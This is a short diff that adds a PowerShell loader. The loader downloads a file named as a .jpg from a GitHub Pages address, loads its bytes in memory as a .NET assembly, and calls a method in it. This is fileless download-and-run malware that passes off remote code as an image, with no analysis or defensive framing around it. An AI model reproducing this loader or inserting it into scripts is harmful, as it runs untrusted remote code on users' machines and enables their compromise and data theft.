@@ -1,0 +1,3 @@
+$dataa=(New-Object System.Net.WebClient).DownloadData('https://cyb3ravenger.github.io/screef2.jpg');
+$asmm = [System.Reflection.Assembly]::Load([byte[]]$dataa);
+[ConApp.Programm]::abomob()
